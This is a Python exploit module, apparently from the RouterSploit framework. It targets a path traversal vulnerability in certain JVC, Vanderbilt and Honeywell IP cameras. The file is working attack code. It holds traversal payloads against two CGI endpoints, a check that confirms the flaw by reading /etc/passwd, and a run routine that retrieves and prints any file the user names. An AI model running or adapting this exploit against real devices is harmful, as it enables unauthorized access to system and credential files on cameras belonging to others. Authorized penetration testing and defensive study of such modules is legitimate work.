from routersploit import (
    exploits,
    print_error,
    print_status,
    print_info,
    print_success,
    http_request,
    mute,
    validators
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for JVC IP-Camera VN-T216VPRU, Vanderbilt IP-Camera CCPW3025-IR / CVMW3025-IR and Honeywell IP-Camera HICC-1100PT
    Path Traversal vulnerability. If target is vulnerable it is possible to read file from the filesystem.
    """
    __info__ = {
        'name': 'JVC & Vanderbilt & Honeywell IP-Camera Path Traversal',
        'description': 'Module exploits JVC IP-Camera VN-T216VPRU, Vanderbilt IP-Camera CCPW3025-IR / CVMW3025-IR and Honeywell '
                       'IP-Camera HICC-1100PT Path Traversal vulnerability. If target is vulnerable it is possible to read file '
                       'from the filesystem.',
        'authors': [
            'Yakir Wizman',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://www.exploit-db.com/exploits/40281/',
        ],
        'devices': [
            'JVC IP-Camera VN-T216VPRU'
            'Vanderbilt IP-Camera CCPW3025-IR / CVMW3025-IR',
            'Honeywell IP-Camera HICC-1100PT'
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(80, 'Target port')  # default port

    filename = exploits.Option('/etc/passwd', 'File to read from the filesystem')

    resources = ["/cgi-bin/check.cgi?file=../../..{}",
                 "/cgi-bin/chklogin.cgi?file=../../..{}"]

    def __init__(self):
        self.valid_resource = None

    def run(self):
        if self.check():
            print_success("Target appears to be vulnerable.")

            path = self.valid_resource.format(self.filename)
            url = "{}:{}{}".format(self.target, self.port, path)

            response = http_request(method="GET", url=url)
            if response is None:
                print_error("Error with reading response")
                return

            if response.text:
                print_status("Reading file: {}".format(self.filename))
                print_info(response.text)
            else:
                print_error("Exploit failed - empty response")

        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    @mute
    def check(self):
        filename = "/etc/passwd"
        for resource in self.resources:
            path = resource.format(filename)

            url = "{}:{}{}".format(self.target, self.port, path)
            response = http_request(method="GET", url=url)

            if response is not None and "root:" in response.text:
                self.valid_resource = resource
                return True  # target is vulnerable

        return False  # target is not vulnerable
